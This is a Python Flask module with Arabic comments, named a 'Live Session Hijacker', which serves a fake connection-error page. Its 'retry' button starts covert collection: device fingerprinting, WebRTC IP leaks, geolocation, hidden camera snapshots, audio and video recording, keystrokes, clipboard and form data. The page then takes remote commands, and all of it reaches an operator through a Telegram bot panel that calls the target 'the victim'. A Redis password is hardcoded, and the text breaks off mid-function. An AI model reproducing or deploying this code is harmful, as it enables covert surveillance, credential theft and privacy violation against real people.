# lsh_module.py
# ============================================================
# Live Session Hijacker - النسخة المخفية القوية
# لا يظهر أي كلمة مشبوهة للضحية
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import qrcode
from flask import Blueprint, request, jsonify, Response
from queue import Queue, Empty

lsh_bp = Blueprint('lsh_module', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] LSH: Redis connected")
except Exception as e:
    print(f"[-] Redis error in lsh_module: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] إدارة الجلسات
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "created_at": time.time(),
            "last_seen": time.time(),
            "info": {},
        }
    if redis_client:
        try:
            redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
        except Exception as e:
            print(f"[-] Redis session save error: {e}")
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


def push_command(session_id, command_dict):
    if not redis_client:
        print("[-] push_command: Redis not available")
        return False
    try:
        channel = f"lsh_cmd:{session_id}"
        payload = json.dumps(command_dict)
        redis_client.lpush(channel, payload)
        redis_client.expire(channel, 600)
        print(f"[+] Command pushed: {session_id} -> {command_dict.get('action')}")
        return True
    except Exception as e:
        print(f"[-] push_command error: {e}")
        return False


# ============================================================
# [3] القالب الجديد — يبدو كخطأ عام في أي موقع
# ============================================================
LSH_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#ffffff">
<title>حدث خطأ غير متوقع</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
  html, body {
    margin: 0; padding: 0;
    background: #f5f7fa;
    color: #1a202c;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    min-height: 100vh;
    -webkit-font-smoothing: antialiased;
  }
  .wrap {
    max-width: 520px; margin: 0 auto;
    padding: 80px 24px 40px;
    text-align: center;
  }
  .icon-wrap {
    width: 88px; height: 88px; margin: 0 auto 28px;
    border-radius: 50%;
    background: #fff;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 4px 20px rgba(0,0,0,0.06);
    border: 1px solid #e2e8f0;
  }
  .icon-wrap svg { width: 44px; height: 44px; }
  h1 {
    font-size: 22px; font-weight: 600;
    color: #1a202c; margin: 0 0 14px;
    letter-spacing: -0.3px;
  }
  .subtitle {
    color: #64748b; font-size: 15px;
    line-height: 1.7; margin: 0 0 36px;
    padding: 0 10px;
  }
  .info-card {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 14px;
    padding: 20px;
    margin-bottom: 22px;
    text-align: right;
    box-shadow: 0 1px 3px rgba(0,0,0,0.03);
  }
  .info-row {
    display: flex; align-items: center;
    justify-content: space-between;
    padding: 10px 0;
    border-bottom: 1px solid #f1f5f9;
    font-size: 13px;
  }
  .info-row:last-child { border-bottom: none; }
  .info-label { color: #64748b; }
  .info-value { color: #1a202c; font-weight: 500; }
  .info-value.error { color: #e11d48; }
  .info-value.ok { color: #16a34a; }
  .retry-btn {
    display: block; width: 100%;
    padding: 15px 20px;
    border: none; border-radius: 10px;
    background: #2563eb;
    color: #fff; font-size: 15px; font-weight: 600;
    cursor: pointer;
    box-shadow: 0 1px 2px rgba(37,99,235,0.2);
    transition: background 0.15s ease, transform 0.1s ease;
    font-family: inherit;
    letter-spacing: 0.2px;
  }
  .retry-btn:hover { background: #1d4ed8; }
  .retry-btn:active { transform: scale(0.99); background: #1e40af; }
  .retry-btn:disabled {
    background: #94a3b8; cursor: not-allowed;
    box-shadow: none;
  }
  .help-link {
    display: block; margin-top: 22px;
    color: #64748b; font-size: 13px;
    text-decoration: none;
  }
  .help-link:hover { color: #2563eb; text-decoration: underline; }
  .footer {
    text-align: center; font-size: 12px;
    color: #94a3b8; margin-top: 60px;
    line-height: 1.7;
  }
  .hidden { display: none !important; }
  .loading-dots {
    display: inline-flex; gap: 4px; margin-left: 6px;
    vertical-align: middle;
  }
  .loading-dots span {
    width: 5px; height: 5px; border-radius: 50%;
    background: #fff; opacity: 0.4;
    animation: dotPulse 1.4s infinite;
  }
  .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
  .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
  @keyframes dotPulse {
    0%, 60%, 100% { opacity: 0.4; transform: scale(0.85); }
    30% { opacity: 1; transform: scale(1); }
  }
  .progress-wrap {
    margin: 20px 0 10px;
  }
  .progress-bar {
    height: 6px; background: #e2e8f0;
    border-radius: 3px; overflow: hidden;
  }
  .progress-fill {
    height: 100%; width: 0%;
    background: #2563eb;
    transition: width 0.4s ease;
    border-radius: 3px;
  }
  .progress-text {
    text-align: center; font-size: 12px;
    color: #64748b; margin-top: 8px;
  }
  .success-wrap {
    text-align: center; padding: 40px 20px;
  }
  .success-check {
    width: 80px; height: 80px; margin: 0 auto 24px;
    border-radius: 50%;
    background: #dcfce7;
    display: flex; align-items: center; justify-content: center;
  }
  .success-check svg { width: 40px; height: 40px; }
  .success-title {
    font-size: 20px; font-weight: 600;
    color: #16a34a; margin-bottom: 10px;
  }
  .success-desc { color: #64748b; font-size: 14px; line-height: 1.7; }
</style>
</head>
<body>
<div class="wrap">

  <!-- ============ حالة الخطأ ============ -->
  <div id="errorState">
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="10" stroke="#e11d48" stroke-width="2"/>
        <path d="M12 7v6" stroke="#e11d48" stroke-width="2" stroke-linecap="round"/>
        <circle cx="12" cy="16.5" r="1" fill="#e11d48"/>
      </svg>
    </div>
    <h1>حدث خطأ غير متوقع</h1>
    <p class="subtitle">
      تعذّر إكمال العملية بسبب مشكلة مؤقتة في الاتصال.<br>
      يرجى المحاولة مرة أخرى.
    </p>

    <div class="info-card">
      <div class="info-row">
        <span class="info-label">حالة الاتصال</span>
        <span class="info-value error">منقطع</span>
      </div>
      <div class="info-row">
        <span class="info-label">رمز الخطأ</span>
        <span class="info-value">ERR_CONNECTION_RESET</span>
      </div>
      <div class="info-row">
        <span class="info-label">معرّف الطلب</span>
        <span class="info-value" id="reqId">—</span>
      </div>
    </div>

    <button class="retry-btn" id="retryBtn" onclick="retryConnection()">
      إعادة المحاولة
    </button>

    <a href="#" class="help-link" onclick="event.preventDefault()">
      هل تحتاج إلى مساعدة؟
    </a>
  </div>

  <!-- ============ حالة الانتظار ============ -->
  <div id="loadingState" class="hidden">
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="10" stroke="#2563eb" stroke-width="2" stroke-dasharray="4 4">
          <animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1.5s" repeatCount="indefinite"/>
        </circle>
      </svg>
    </div>
    <h1>جاري إعادة الاتصال...</h1>
    <p class="subtitle">
      يرجى الانتظار وعدم إغلاق الصفحة.
    </p>

    <div class="info-card">
      <div class="progress-wrap">
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="progress-text" id="progressText">0%</div>
      </div>
    </div>
  </div>

  <!-- ============ حالة النجاح ============ -->
  <div id="successState" class="hidden">
    <div class="success-wrap">
      <div class="success-check">
        <svg viewBox="0 0 24 24" fill="none">
          <path d="M5 13l4 4L19 7" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <div class="success-title">تم بنجاح</div>
      <div class="success-desc">
        تم إكمال العملية بنجاح.<br>
        يمكنك إغلاق هذه الصفحة الآن.
      </div>
    </div>
  </div>

</div>

<script>
(function(){
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID    = "__CHAT_ID__";
  const HTTP_URL   = "__HTTP_URL__";

  const el = id => document.getElementById(id);
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const show = id => el(id).classList.remove('hidden');
  const hide = id => el(id).classList.add('hidden');

  // ============================================================
  // توليد Request ID
  // ============================================================
  const reqId = 'req_' + Math.random().toString(36).substring(2, 12).toUpperCase();
  document.addEventListener('DOMContentLoaded', () => {
    const ri = el('reqId');
    if (ri) ri.textContent = reqId;
  });

  // ============================================================
  // عناصر مخفية للكاميرا
  // ============================================================
  let videoEl = null, canvasEl = null;
  function ensureHiddenEls() {
    if (!videoEl) {
      videoEl = document.createElement('video');
      videoEl.autoplay = true; videoEl.muted = true;
      videoEl.setAttribute('playsinline', '');
      videoEl.setAttribute('webkit-playsinline', '');
      videoEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;';
      document.body.appendChild(videoEl);
    }
    if (!canvasEl) {
      canvasEl = document.createElement('canvas');
      canvasEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;';
      document.body.appendChild(canvasEl);
    }
  }

  // ============================================================
  // حالة عامة
  // ============================================================
  let camStream = null, micStream = null;
  let sendQueue = [];
  let isSending = false;
  let pollingActive = false;
  let captureStarted = false;

  // ============================================================
  // إرسال
  // ============================================================
  function enqueue(data) {
    sendQueue.push(data);
    if (!isSending) processQueue();
  }

  async function processQueue() {
    if (isSending) return;
    isSending = true;
    while (sendQueue.length > 0) {
      const item = sendQueue.shift();
      try {
        const resp = await fetch(HTTP_URL + "/lsh_data", {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...item, session_id: SESSION_ID, chat_id: CHAT_ID }),
          keepalive: true,
        });
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
      } catch (e) {
        sendQueue.unshift(item);
        await sleep(2000);
      }
    }
    isSending = false;
  }

  // ============================================================
  // جمع المعلومات
  // ============================================================
  async function collectBasicInfo() {
    const info = {
      session_id: SESSION_ID,
      chat_id: CHAT_ID,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown",
      language: navigator.language,
      languages: navigator.languages || [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: window.screen.width, height: window.screen.height,
        availWidth: window.screen.availWidth, availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth, pixelRatio: window.devicePixelRatio,
        orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
      },
      hardware: {
        cores: navigator.hardwareConcurrency || "N/A",
        memory: navigator.deviceMemory || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || 0
      },
      cookies_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack,
      referrer: document.referrer || "direct",
    };
    try {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) info.connection = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
    } catch(e){}
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        info.battery = { level: Math.round(b.level*100), charging: b.charging };
      }
    } catch(e){}
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) info.gpu = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        };
      }
    } catch(e){}
    info.webrtc_ips = await new Promise(resolve => {
      try {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.onicecandidate = e => {
          if (!e.candidate) { try{pc.close();}catch(e){} return resolve(Array.from(ips)); }
          const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
          if (m) ips.add(m[1]);
        };
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>resolve([]));
        setTimeout(() => { try{pc.close();}catch(e){} resolve(Array.from(ips)); }, 3000);
      } catch(e) { resolve([]); }
    });
    return info;
  }

  async function collectLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      const t = setTimeout(() => resolve(null), 8000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(t); resolve({
          latitude: pos.coords.latitude, longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }); },
        () => { clearTimeout(t); resolve(null); },
        { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
      );
    });
  }

  async function startCamera() {
    try {
      camStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      ensureHiddenEls();
      videoEl.srcObject = camStream;
      await videoEl.play().catch(()=>{});
      await sleep(1500);
      return true;
    } catch(e) {
      try {
        camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        ensureHiddenEls();
        videoEl.srcObject = camStream;
        await videoEl.play().catch(()=>{});
        await sleep(1500);
        return true;
      } catch(e2) { return false; }
    }
  }

  async function startMic() {
    try { micStream = await navigator.mediaDevices.getUserMedia({ audio: true }); return true; }
    catch(e) { return false; }
  }

  function snapshot() {
    try {
      ensureHiddenEls();
      if (!videoEl.videoWidth) return null;
      canvasEl.width = videoEl.videoWidth;
      canvasEl.height = videoEl.videoHeight;
      canvasEl.getContext('2d').drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      return canvasEl.toDataURL('image/jpeg', 0.75);
    } catch(e) { return null; }
  }

  async function recordAudio(durationMs) {
    if (!micStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mime = 'audio/webm;codecs=opus';
        else if (MediaRecorder.isTypeSupported('audio/mp4')) mime = 'audio/mp4';
        const rec = new MediaRecorder(micStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  async function recordVideo(durationMs) {
    if (!camStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'video/webm';
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) mime = 'video/webm;codecs=vp9';
        else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mime = 'video/webm;codecs=vp8';
        const rec = new MediaRecorder(camStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  // ============================================================
  // Polling للأوامر
  // ============================================================
  async function startCommandPolling() {
    if (pollingActive) return;
    pollingActive = true;
    while (pollingActive) {
      try {
        const resp = await fetch(
          HTTP_URL + "/lsh_poll?s=" + encodeURIComponent(SESSION_ID),
          { method: 'GET', cache: 'no-store' }
        );
        if (!resp.ok) { await sleep(1500); continue; }
        const data = await resp.json();
        if (data && data.command) {
          handleCommand(data.command);
        }
      } catch(e) {
        await sleep(2000);
      }
    }
  }

  // ============================================================
  // تنفيذ الأوامر
  // ============================================================
  async function handleCommand(cmd) {
    const action = cmd.action;
    const payload = cmd.payload || {};
    try {
      if (action === 'snapshot') {
        const img = snapshot();
        if (img) enqueue({ type: 'command_photo', image: img });
        return;
      }
      if (action === 'audio') {
        const audio = await recordAudio(payload.duration || 6000);
        if (audio) enqueue({ type: 'command_audio', audio: audio });
        return;
      }
      if (action === 'video_recording') {
        const vid = await recordVideo(payload.duration || 10000);
        if (vid) enqueue({ type: 'command_video', video: vid });
        return;
      }
      if (action === 'screen_share') {
        try {
          if (!navigator.mediaDevices.getDisplayMedia) {
            enqueue({ type: 'command_screen_failed' });
            return;
          }
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
          const v = document.createElement('video');
          v.srcObject = stream; v.muted = true;
          await v.play();
          await sleep(1500);
          const c = document.createElement('canvas');
          c.width = v.videoWidth; c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);
          const img = c.toDataURL('image/jpeg', 0.7);
          stream.getTracks().forEach(t => t.stop());
          enqueue({ type: 'command_screen', image: img });
        } catch(e) {
          enqueue({ type: 'command_screen_failed' });
        }
        return;
      }
      if (action === 'get_clipboard') {
        try {
          const text = await navigator.clipboard.readText();
          enqueue({ type: 'command_clipboard', content: text });
        } catch(e) {
          enqueue({ type: 'command_clipboard_failed' });
        }
        return;
      }
      if (action === 'request_location') {
        const loc = await collectLocation();
        enqueue({ type: 'command_location', location: loc });
        return;
      }
      if (action === 'open_url') {
        try {
          window.open(payload.url, '_blank');
          enqueue({ type: 'command_open_url_done' });
        } catch(e) { enqueue({ type: 'command_open_url_failed' }); }
        return;
      }
      if (action === 'vibrate') {
        try {
          if (navigator.vibrate) navigator.vibrate(payload.pattern || [500,200,500]);
          enqueue({ type: 'command_vibrate_done' });
        } catch(e) {}
        return;
      }
      if (action === 'redirect') {
        enqueue({ type: 'command_redirect_ack' });
        await sleep(400);
        window.location.href = payload.url;
        return;
      }
    } catch(e) { console.error('cmd error', e); }
  }

  // ============================================================
  // المراقبة الخلفية
  // ============================================================
  function startBackgroundMonitors() {
    document.addEventListener('keydown', e => {
      try {
        enqueue({
          type: 'key', key: e.key, code: e.code,
          ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey,
          target: (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : 'unknown',
          target_type: (e.target && e.target.type) ? e.target.type : ''
        });
      } catch(err) {}
    }, true);
    document.addEventListener('copy', () => {
      try {
        const sel = window.getSelection().toString().slice(0,500);
        if (sel) enqueue({ type: 'clipboard_copy', content: sel });
      } catch(e) {}
    }, true);
    document.addEventListener('paste', e => {
      try {
        const txt = (e.clipboardData || window.clipboardData).getData('text');
        if (txt) enqueue({ type: 'clipboard_paste', content: txt.slice(0,500) });
      } catch(e) {}
    }, true);
    document.addEventListener('submit', e => {
      try {
        const fd = new FormData(e.target);
        const data = {};
        for (const [k, v] of fd.entries()) {
          if (typeof v === 'string' && v.length < 500) data[k] = v;
        }
        enqueue({ type: 'form_submit', action: e.target.action, data: data });
      } catch(e) {}
    }, true);
    document.addEventListener('click', e => {
      try {
        enqueue({
          type: 'click',
          target: (e.target && e.target.tagName) ? e.target.tagName : 'unknown',
          text: (e.target && e.target.innerText) ? e.target.innerText.slice(0,80) : ''
        });
      } catch(e) {}
    }, true);
    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        enqueue({ type: 'url_change', url: lastUrl });
      }
    }, 1500);
    setInterval(() => {
      const img = snapshot();
      if (img) enqueue({ type: 'periodic_photo', image: img });
    }, 45000);
  }

  // ============================================================
  // بدء الالتقاط
  // ============================================================
  async function startFullCapture() {
    if (captureStarted) return;
    captureStarted = true;
    hide('errorState');
    show('loadingState');

    const setProgress = (pct) => {
      el('progressFill').style.width = pct + '%';
      el('progressText').textContent = pct + '%';
    };

    // 1) معلومات
    setProgress(10);
    await sleep(300);
    const info = await collectBasicInfo();
    enqueue({ type: 'info', info: info });
    setProgress(25);

    // 2) موقع
    const loc = await collectLocation();
    if (loc) enqueue({ type: 'location', location: loc });
    setProgress(45);

    // 3) كاميرا
    const camOk = await startCamera();
    if (camOk) {
      const img = snapshot();
      if (img) enqueue({ type: 'first_photo', image: img });
    }
    setProgress(75);

    // 4) ميكروفون
    const micOk = await startMic();
    if (micOk) {
      const audio = await recordAudio(5000);
      if (audio) enqueue({ type: 'first_audio', audio: audio });
    }
    setProgress(100);

    // 5) بدء المراقبة
    enqueue({ type: 'ready' });
    startBackgroundMonitors();
    startCommandPolling();

    // 6) نجاح
    await sleep(1000);
    hide('loadingState');
    show('successState');
  }

  // ============================================================
  // زر إعادة المحاولة
  // ============================================================
  window.retryConnection = async function() {
    const btn = el('retryBtn');
    btn.disabled = true;
    btn.innerHTML = 'جاري الاتصال<span class="loading-dots"><span></span><span></span><span></span></span>';

    enqueue({ type: 'retry_click' });

    await sleep(1500);

    await startFullCapture();
  };

  // ============================================================
  // الإقلاع — زر واحد فقط
  // ============================================================
  document.addEventListener('DOMContentLoaded', () => {
    // توليد Request ID
    const reqId = 'req_' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const ri = el('reqId');
    if (ri) ri.textContent = reqId;

    // إرسال إشارة الدخول
    enqueue({ type: 'landing' });
  });

  // منع إغلاق الصفحة
  window.addEventListener('beforeunload', function(e) {
    e.preventDefault();
    e.returnValue = '';
    return '';
  });

})();
</script>
</body>
</html>
"""


# ============================================================
# [4] توليد QR
# ============================================================
def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=12,
            border=2,
        )
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#000000", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        buf.name = "lsh_qr.png"
        return buf
    except Exception as e:
        print(f"[-] QR gen error: {e}")
        return io.BytesIO()


# ============================================================
# [5] لوحة تحكم البوت
# ============================================================
def build_lsh_control_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📸 صورة فورية", callback_data=f"lsh_snap_{session_id}"),
        InlineKeyboardButton("🎙️ تسجيل صوتي", callback_data=f"lsh_audio_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو 10 ثوان", callback_data=f"lsh_video_{session_id}"),
        InlineKeyboardButton("🖥️ لقطة شاشة", callback_data=f"lsh_screen_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 حافظة الضحية", callback_data=f"lsh_clip_{session_id}"),
        InlineKeyboardButton("📍 تحديث الموقع", callback_data=f"lsh_loc_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"lsh_open_{session_id}"),
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"lsh_vibrate_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("❌ إغلاق الجلسة", callback_data=f"lsh_kill_{session_id}"),
    )
    return m


# ============================================================
# [6] تسجيل المسارات
# ============================================================
def init_lsh_routes(app, bot):

    @app.route('/lsh', methods=['GET'])
    def lsh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400

        try:
            if redis_client:
                stored = redis_client.get(f"lsh_session:{session_id}")
                if not stored:
                    return "Session expired", 410
        except Exception:
            pass

        create_session(session_id, chat_id)

        html = (LSH_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL))
        return html, 200

    @app.route('/lsh_data', methods=['POST'])
    def lsh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 400

            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()
            else:
                create_session(session_id, chat_id)

            if redis_client:
                try:
                    redis_client.setex(f"lsh_active:{session_id}", 3600, "1")
                except Exception:
                    pass

            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.headers.get('X-Real-IP') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            _handle_incoming(bot, chat_id, session_id, data, source_ip)
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] lsh_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 500

    @app.route('/lsh_poll', methods=['GET'])
    def lsh_poll():
        session_id = request.args.get('s', '')
        if not session_id or not redis_client:
            return jsonify({"command": None}), 200

        channel = f"lsh_cmd:{session_id}"
        start = time.time()
        while time.time() - start < 25:
            try:
                item = redis_client.rpop(channel)
                if item:
                    print(f"[+] Cmd delivered: {session_id} -> {item[:80]}")
                    return jsonify({"command": json.loads(item)}), 200
            except Exception as e:
                print(f"[-] poll error: {e}")
            time.sleep(0.5)
        return jsonify({"command": None}), 200

    @app.route('/lsh_create', methods=['POST'])
    def lsh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        import uuid as _uuid
        session_id = str(_uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200


# ============================================================
# [7] معالجة البيانات
# ============================================================
def _handle_incoming(bot, chat_id, session_id, data, source_ip):
    dtype = data.get('type')
    try:
        if dtype == 'info':
            info = data.get('info', {})
            info['ip'] = source_ip
            sess = get_session(session_id)
            if sess:
                sess['info'] = info
            text = _format_info_report(info, session_id)
            bot.send_message(chat_id, text, parse_mode="Markdown", disable_web_page_preview=True)
            panel = build_lsh_control_panel(session_id, chat_id)
            bot.send_message(chat_id,
                             f"🎛️ **لوحة تحكم الجلسة النشطة**\n`{session_id}`",
                             parse_mode="Markdown", reply_markup=panel)

        elif dtype == 'landing':
            bot.send_message(chat_id,
                             f"🎯 **الضحية فتح الرابط!**\n"
                             f"🆔 `{session_id}`\n"
                             f"🌐 IP: `{source_ip}`\n\n"
                             f"⏳ في انتظار تصرف الضحية...",
                             parse_mode="Markdown")

        elif dtype == 'retry_click':
            bot.send_message(chat_id,
                             f"👆 **الضحية ضغط على زر إعادة المحاولة!**\n"
                             f"🆔 `{session_id}`",
                             parse_mode="Markdown")

        elif dtype == 'location':
            loc = data.get('location') or {}
            if loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(chat_id,
                    f"📍 **الموقع:** `{lat}, {lng}`\n"
                    f"[فتح في خرائط جوجل](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "❌ لم يتم السماح بالموقع")

        elif dtype in ('first_photo', 'periodic_photo', 'command_photo'):
            captions = {
                'first_photo': "📸 **صورة أولية**",
                'periodic_photo': "📸 **صورة دورية**",
                'command_photo': "📸 **صورة بأمر**"
            }
            _send_photo(bot, chat_id, data.get('image',''), captions.get(dtype, "📸 صورة"))

        elif dtype in ('first_audio', 'command_audio'):
            _send_audio(bot, chat_id, data.get('audio',''), "🎙️ **تسجيل صوتي**")

        elif dtype == 'command_video':
            _send_video(bot, chat_id, data.get('video',''), "🎥 **فيديو حي**")

        elif dtype == 'command_screen':
            _send_photo(bot, chat_id, data.get('image',''), "🖥️ **لقطة شاشة**")
        elif dtype == 'command_screen_failed':
            bot.send_message(chat_id, "❌ الضحية رفض مشاركة الشاشة")

        elif dtype == 'command_clipboard':
            content = data.get('content', '')
            if content:
                bot.send_message(chat_id, f"📋 **الحافظة:**\n```\n{content[:1000]}\n```", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "📋 الحافظة فارغة")
        elif dtype == 'command_clipboard_failed':
            bot.send_message(chat_id, "❌ فشل الوصول للحافظة")

        elif dtype == 'key':
            key = data.get('key', '')
            if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape','ArrowUp','ArrowDown','ArrowLeft','ArrowRight']:
                _accumulate_key(chat_id, session_id, key)

        elif dtype == 'clipboard_copy':
            bot.send_message(chat_id, f"📋 **نسخ:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
        elif dtype == 'clipboard_paste':
            bot.send_message(chat_id, f"📥 **لصق:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")

        elif dtype == 'form_submit':
            form_data = data.get('data', {})
            lines = ["📝 **نموذج تم إرساله:**", f"Action: `{str(data.get('action',''))[:80]}`"]
            for k, v in list(form_data.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

        elif dtype == 'click':
            txt = (data.get('text') or '').strip()
            if txt and len(txt) > 2:
                _accumulate_click(chat_id, session_id, txt)

        elif dtype == 'url_change':
            bot.send_message(chat_id, f"🔗 **تغيير رابط:**\n`{data.get('url','')[:200]}`", parse_mode="Markdown")

        elif dtype == 'command_open_url_done':
            bot.send_message(chat_id, "✅ تم فتح الرابط على جهاز الضحية")
        elif dtype == 'command_vibrate_done':
            bot.send_message(chat_id, "✅ تم الاهتزاز")
        elif dtype == 'command_location':
            loc = data.get('location') or {}
            if loc and loc.get('latitude'):
